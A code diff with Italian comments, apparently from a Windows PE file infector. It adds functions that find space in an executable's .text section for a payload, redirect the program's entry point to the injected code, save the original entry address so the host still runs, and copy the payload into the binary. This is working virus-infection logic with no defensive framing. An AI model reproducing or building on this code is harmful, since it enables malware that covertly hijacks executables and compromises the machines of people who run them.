@@ -3,6 +3,14 @@
 // nasm -f win32 file.s
 // link /subsystem:console /defaultlib:kernel32.lib /entry:start file.obj
 
+/**
+ * Ricerca la sezione da infettare (.text) e controlla se ha abbastanza spazio per il payload
+ * @param binary struttura del binario
+ * @param pe_file struttura contenente le informazioni sul binario
+ * @param payload payload
+ * @param new_entry valore da modificare con la nuova entry
+ * @return l'indice della sezione text o -1 in caso di errore
+ */
 int 	find_section_to_infect_PE64(t_mem_image *binary, t_pe_file *pe_file, t_mem_image *payload, uint32_t *new_entry)
 {
 	int i = 0;
@@ -39,4 +47,22 @@ int 	find_section_to_infect_PE64(t_mem_image *binary, t_pe_file *pe_file, t_mem_
 		return -1;
 	*new_entry = offset;
 	return i;
+}
+
+void 	insert_payload_PE64(t_mem_image *binary, t_pe_file *pe_file, int index_section, t_mem_image *payload, uint32_t new_entry)
+{
+	uint32_t original_entry = pe_file->optional_hdr->AddressOfEntryPoint + pe_file->optional_hdr->ImageBase;
+
+	// modifico l'entry nel binario
+	pe_file->optional_hdr->AddressOfEntryPoint = new_entry + pe_file->sections[index_section].VirtualAddress - pe_file->sections[index_section].PointerToRawData;
+	//memcpy(payload->addr - 4, &original_entry, sizeof(uint32_t));
+	// inserisco nel payload l'indirizzo della vecchia entry
+	*(uint32_t *)(payload->addr + payload->size - 4) = (uint32_t )original_entry;
+	// copio il payload nel binario
+	memcpy(binary->addr + new_entry, payload->addr, payload->size);
+
+	puts("");
+	for(int i = 0; i < PAYLOAD_PE_SIZE; ++i)
+		printf("%x ", ((unsigned char*)payload->addr)[i]);
+	puts("");
 }
